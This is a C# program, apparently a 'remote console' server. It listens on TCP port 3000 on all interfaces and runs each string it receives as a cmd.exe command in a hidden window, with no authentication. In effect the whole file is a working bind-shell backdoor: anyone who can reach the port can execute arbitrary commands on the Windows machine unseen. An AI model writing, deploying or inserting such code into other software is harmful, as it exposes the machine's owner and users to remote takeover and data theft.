using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Remote_Console
{
    class Server
    {
        static void Main(string[] args)
        {
            TcpListener server = new TcpListener(IPAddress.Any, 3000);
            server.Start();
            Console.WriteLine("Server started.");

            TcpClient serverClient = server.AcceptTcpClient();
            Console.WriteLine("New connection.");
            NetworkStream stream = serverClient.GetStream();

            do
            {
                if (stream.DataAvailable)
                {
                    StringBuilder data = new StringBuilder();
                    byte[] buffer = new byte[256];
                    int bytesCount;

                    bytesCount = stream.Read(buffer);
                    data.Append(Encoding.UTF8.GetString(buffer, 0, bytesCount));

                    string commands = data.ToString();
                    Console.WriteLine(commands);

                    var proc = new ProcessStartInfo()
                    {
                        UseShellExecute = true,
                        WorkingDirectory = @"C:\Windows\System32",
                        FileName = @"C:\Windows\System32\cmd.exe",
                        Arguments = "/c " + commands,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process.Start(proc);
                }
            } while (true);
        }
    }
}
